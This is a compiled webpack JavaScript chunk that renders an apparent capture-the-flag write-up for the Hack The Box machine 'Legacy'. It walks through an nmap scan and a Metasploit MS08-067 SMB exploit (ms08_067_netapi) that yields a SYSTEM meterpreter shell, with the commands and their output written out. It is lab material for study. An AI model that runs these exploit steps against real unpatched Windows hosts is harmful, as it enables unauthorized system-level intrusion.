(window.webpackJsonp=window.webpackJsonp||[]).push([[82],{424:function(s,t,e){"use strict";e.r(t);var n=e(13),a=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"legacy"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#legacy"}},[s._v("#")]),s._v(" Legacy")]),s._v(" "),t("h2",{attrs:{id:"initial-scan"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#initial-scan"}},[s._v("#")]),s._v(" Initial scan")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-T5")]),s._v(" -p- "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.4\n")])])]),t("p",[s._v("Result")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-15 02:09 EDT\nNmap scan report for 10.10.10.4\nHost is up (0.074s latency).\nNot shown: 65532 filtered ports\nPORT     STATE  SERVICE       VERSION\n139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open   microsoft-ds  Windows XP microsoft-ds\n3389/tcp closed ms-wbt-server\nDevice type: general purpose|specialized\nRunning (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (92%), General Dynamics embedded (88%)\nOS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2\nAggressive OS guesses: Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (92%), Microsoft Windows XP SP2 (92%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP Professional SP2 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n|_clock-skew: mean: -3h58m46s, deviation: 1h24m51s, median: -4h58m46s\n|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:f6:5f (VMware)\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: legacy\n|   NetBIOS computer name: LEGACY\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2020-03-15T05:12:29+02:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT      ADDRESS\n1   73.97 ms 10.10.14.1\n2   74.71 ms 10.10.10.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 162.70 seconds\n")])])]),t("p",[s._v("We have 2 ports, 1 service. Port 129 and port 445. Mostly about SMB. Lets try to exploit this.")]),s._v(" "),t("h2",{attrs:{id:"smb-scan"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#smb-scan"}},[s._v("#")]),s._v(" SMB scan")]),s._v(" "),t("p",[s._v("First, let's find out the SMB version that this box is running")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfconsole\nmsf5 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" search smb_version\n\nMatching Modules\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v("\n\n   "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#  Name                               Disclosure Date  Rank    Check  Description")]),s._v("\n   -  ----                               ---------------  ----    -----  -----------\n   "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection\n\n\nmsf5 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use auxiliary/scanner/smb/smb_version \n")])])]),t("p",[s._v("A quick google for Windows XP SP3 SMB exploit rapid-7 gives us "),t("a",{attrs:{href:"https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi",target:"_blank",rel:"noopener noreferrer"}},[s._v("rapid7"),t("OutboundLink")],1)]),s._v(" "),t("h2",{attrs:{id:"exploitation"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#exploitation"}},[s._v("#")]),s._v(" Exploitation")]),s._v(" "),t("p",[s._v("We now attempt to exploit the machine")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msf "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/windows/smb/ms08_067_netapi\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms08_067_netapi"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" show targets\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms08_067_netapi"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" TARGET "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms08_067_netapi"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" show options\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms08_067_netapi"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rhosts "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.4\nmsf exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ms08_067_netapi"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" run\n")])])]),t("p",[s._v("We get back a meterpreter shell. Let's first take a look at who we are")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("meterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" getuid\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Server username: NT AUTHORITY\\SYSTEM")]),s._v("\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" sysinfo\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Computer        : LEGACY")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# OS              : Windows XP (5.1 Build 2600, Service Pack 3).")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Architecture    : x86")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# System Language : en_US")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Domain          : HTB")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Logged On Users : 1")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Meterpreter     : x86/windows")]),s._v("\n")])])]),t("p",[s._v("Taking a look around with the shell, the flags are found at "),t("code",[s._v("C:\\Documents and Settings\\john\\Desktop>")]),s._v(" and "),t("code",[s._v("C:\\Documents and Settings\\Administrator\\Desktop")]),s._v(" with the command "),t("code",[s._v("type user.txt")])])])}),[],!1,null,null,null);t.default=a.exports}}]);